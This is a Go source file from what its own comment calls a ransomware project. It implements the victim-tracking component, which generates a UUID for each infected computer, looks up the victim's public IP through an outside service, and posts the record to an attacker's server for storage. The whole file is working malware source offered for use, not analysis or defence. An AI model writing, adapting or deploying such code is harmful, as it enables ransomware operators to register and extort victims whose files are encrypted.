package victim

import (
	"bytes"
	"encoding/json"
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"time"

	uuid "github.com/satori/go.uuid"
)

// VictimIndentifer helps the server identify the victim's computer.
type VictimIndentifier struct {
	UUID      string `json:"uuid"` // a unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

// NewVictimIndentifer returns a pointer to a victim indentifer with a generated UUID and a timestamp.
func NewVictimIndentifer() *VictimIndentifier {
	uuid, err := uuid.NewV4()

	// lost likely will not fail, but still handle the error
	if err != nil {
		log.Fatalf("fatal error generating uuid: %s", err)
	}

	return &VictimIndentifier{
		UUID:      uuid.String(),
		Timestamp: time.Now().Unix(),
	}
}

// SendToServer sends the victim indentifier data to the server to be stored in
// a database. Takes in a custom path such that setting up the ransomware is easier for users.
func (vi *VictimIndentifier) SendToServer(url string) error {
	jsonBody, err := json.Marshal(vi)
	if err != nil {
		return errors.New("error unmarshaling json data: " + err.Error())
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return errors.New("error sending victim data to server: " + err.Error())
	}

	if resp.StatusCode != http.StatusOK {
		return errors.New("the status of the rqeuest wasn't successfull")
	}

	return nil
}

func (vi *VictimIndentifier) GetPublicAPI() (string, error) {
	res, err := http.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "", err
	}
	defer res.Body.Close()
	ip, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	return string(ip), nil
}
